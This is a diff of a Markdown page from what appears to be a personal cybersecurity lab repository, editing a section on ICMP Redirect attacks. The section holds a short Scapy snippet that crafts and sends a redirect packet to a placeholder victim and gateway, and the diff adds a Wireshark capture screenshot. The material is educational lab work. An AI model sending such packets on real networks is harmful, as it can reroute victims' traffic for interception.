@@ -21,12 +21,19 @@ ICMP Redirect:
 
 ICMP_redirect python code
 
-```from scapy.all import *
+
+from scapy.all import *
 
 Craft ICMP Redirect packet
 icmp_redirect = Ether() / IP(dst="victim_ip") / ICMP(type=5, code=1, gw="gateway_ip")
 
 Send ICMP Redirect packet
-sendp(icmp_redirect, iface="your_network_interface")```
+sendp(icmp_redirect, iface="your_network_interface")
 
 <img width="844" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/b1457468-e692-48b3-b56e-77e3746cbc94">
+
+
+ICMP Redirect capture in wireshark
+
+<img width="1285" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/cbd98731-bf75-4ee2-b415-a74893ff4cb3">
+
